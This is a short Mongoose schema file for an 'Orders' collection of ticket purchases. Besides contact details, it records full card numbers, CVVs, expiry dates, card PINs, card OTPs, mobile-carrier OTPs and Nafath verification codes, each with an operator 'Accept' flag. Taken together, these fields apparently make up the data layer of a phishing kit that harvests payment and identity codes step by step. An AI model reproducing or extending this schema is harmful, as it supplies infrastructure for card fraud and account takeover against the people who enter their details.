const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema({
    ticket_name: String,
    firstName: String,
    lastName: String,
    email: String,
    phone: String,
    totalPrice: Number,
    visitors: Object,
    countryCode: String,
    date: String,
    card_name: String,
    cardNumber: String,
    cvv: String,
    expiryDate: String,
    pin: String,
    level: String,
    CardOtp: String,
    CardAccept: {
      type: Boolean,
      default: false,
    },
    OtpCardAccept: {
      type: Boolean,
      default: false,
    },
    PinAccept: {
      type: Boolean,
      default: false,
    },

    phoneNumber: String,
    phoneNetwork: String,
    phoneAccept: {
      type: Boolean,
      default: false,
    },
    STCAccept: {
      type: Boolean,
      default: true,
    },
    MobilyAccept: {
      type: Boolean,
      default: true,
    },
    mobOtp: String,
    mobOtpAccept: {
      type: Boolean,
      default: false,
    },
    phoneNumber: String,
    phoneNetwork: String,

    phoneOtp: String,

    phoneOtpAccept: {
      type: Boolean,
      default: false,
    },
    navazCode: String,
    networkAccept: {
      type: Boolean,
      default: false,
    },
    navazAceept: {
      type: Boolean,
      default: false,
    },
    navazOtp: String,
    navazOtpAccept: {
      type: Boolean,
      default: false,
    },
    checked: {
      type: Boolean,
      default: false,
    },
    created: { type: Date, default: Date.now },
  })
);
